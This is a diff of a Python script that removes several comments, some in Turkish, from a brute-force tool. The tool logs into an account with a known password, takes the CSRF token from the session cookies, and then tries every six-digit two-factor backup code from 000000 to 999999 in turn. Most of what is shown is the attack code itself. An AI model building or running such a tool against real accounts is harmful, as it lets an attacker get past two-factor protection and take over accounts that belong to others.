@@ -3,7 +3,7 @@ import time
 import random
 
 def generate_backup_codes():
-    # 000000'dan 999999'a kadar olan yedek kodları oluştur
+    
     return [str(i).zfill(6) for i in range(1000000)]
 
 def login_and_get_csrf_token(username, password):
@@ -20,7 +20,7 @@ def login_and_get_csrf_token(username, password):
     response = session.post(url, data=login_payload)
     
     if response.status_code == 200 and response.json().get('authenticated'):
-        # CSRF token'ı çerezlerden al
+        
         csrf_token = session.cookies.get('csrftoken')
         return csrf_token, session
     else:
@@ -56,7 +56,7 @@ def brute_force_backup_codes(username, password, csrf_token, session):
         else:
             print(f'Hata ile kod {code}: {response.status_code}')
         
-        time.sleep(1)  # wait 1 second before trying the next code
+        time.sleep(1)  
     return None
 
 def main():
@@ -67,7 +67,7 @@ def main():
     csrf_token, session = login_and_get_csrf_token(username, password)
     
     if csrf_token and session:
-        # Yedek kodları dene
+       
         valid_code = brute_force_backup_codes(username, password, csrf_token, session)
         
         if valid_code:
